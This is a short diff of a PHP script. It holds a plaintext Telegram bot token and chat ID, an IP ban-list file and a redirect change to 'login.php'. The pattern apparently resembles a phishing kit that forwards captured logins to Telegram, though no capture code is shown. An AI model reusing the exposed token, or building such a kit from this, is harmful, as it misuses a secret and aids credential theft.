@@ -3,7 +3,7 @@
 $botToken = '8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s'; // updated token
 $chatId = '-4932499123'; // updated chat ID
 $bannedFile = __DIR__ . '/banned_ips.txt';
-$redirectTo = 'steps/login.php';
+$redirectTo = 'login.php';
 
 // === GET USER IP ===
 function getUserIP() {
